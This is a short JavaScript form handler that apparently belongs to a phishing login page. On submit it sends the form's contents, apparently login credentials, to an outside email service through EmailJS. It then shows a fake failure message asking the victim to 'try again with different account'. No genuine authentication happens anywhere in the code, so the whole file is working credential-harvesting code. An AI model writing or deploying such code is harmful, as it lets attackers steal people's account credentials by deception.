const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   btn.value = 'Login...';

   const serviceID = 'default_service';
   const templateID = 'template_zjtg3in';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Login';
      alert('Please,try again with different account!');
    }, (err) => {
      btn.value = 'Login';
      alert(JSON.stringify(err));
    });
});
